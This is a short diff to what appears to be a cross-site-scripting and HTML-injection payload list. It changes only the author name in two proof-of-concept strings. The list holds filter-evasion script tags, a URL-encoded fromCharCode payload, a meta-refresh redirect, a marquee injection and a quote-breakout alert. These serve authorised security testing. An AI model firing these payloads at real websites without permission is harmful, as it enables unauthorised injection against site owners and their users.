@@ -1,10 +1,10 @@
 <a href="https://bing.com" target="_blank" title="click here"><b>click here</b></a>
 <script>alert("1")</ScriPt>
-<script>alert("POC BY SHATHISH")</Script>
+<script>alert("POC BY MAYANK GANDHI")</Script>
 <scrIpT>alert(document.domain)</scriPT>
 /%22%3Cscript%3Ealert(String.fromCharCode(88,%20115,%20115,%2032,%2066,%20121,%2032,%2079,%20108,%20100,%2077,%20111,%20104,%2097,%20109,%20109))%3C/script%3E
 <!DOCTYPE html> <html> <meta http-equiv="refresh" content="0.9; url=http://www.google.com/">&lt;SUBSCRIBE TO OUR CHANNEL&gt; </html>
-<!DOCTYPE html> <html>     <head>       <title>HTML marquee Tag</title>    </head> 	    <body>       <marquee>HTML INJECTION POC DONE BY SHATHISH </marquee>    </body> 	 </html>
+<!DOCTYPE html> <html>     <head>       <title>HTML marquee Tag</title>    </head> 	    <body>       <marquee>HTML INJECTION POC DONE BY MAYANK GANHDI </marquee>    </body> 	 </html>
 <a href=”#” onclick=”...var data='{some_data_here}'...”>
 &apos;-alert(3301)-&apos;
 document.getElementById("cicada").innerHTML = `Hello ${user.username}`
